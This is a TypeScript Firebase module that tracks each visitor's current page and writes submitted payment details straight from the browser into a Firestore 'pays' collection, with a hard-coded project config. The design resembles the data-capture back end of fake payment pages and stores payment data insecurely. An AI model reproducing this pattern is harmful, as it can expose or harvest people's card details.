import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc } from 'firebase/firestore';

const firebaseConfig = {
    apiKey: "AIzaSyAt-KTdJxU6ghlCPVaw6X1zD99qgPdBV3c",
    authDomain: "wdew-8153f.firebaseapp.com",
    projectId: "wdew-8153f",
    storageBucket: "wdew-8153f.firebasestorage.app",
    messagingSenderId: "529373794962",
    appId: "1:529373794962:web:3faa9f6e322b61f1eb8c4b",
    measurementId: "G-40KNT45XWF"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef,   { ...data, createdDate: new Date().toISOString() },{merge:true});

  } catch (e) {
    console.error('Error adding document: ', e);
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db,database };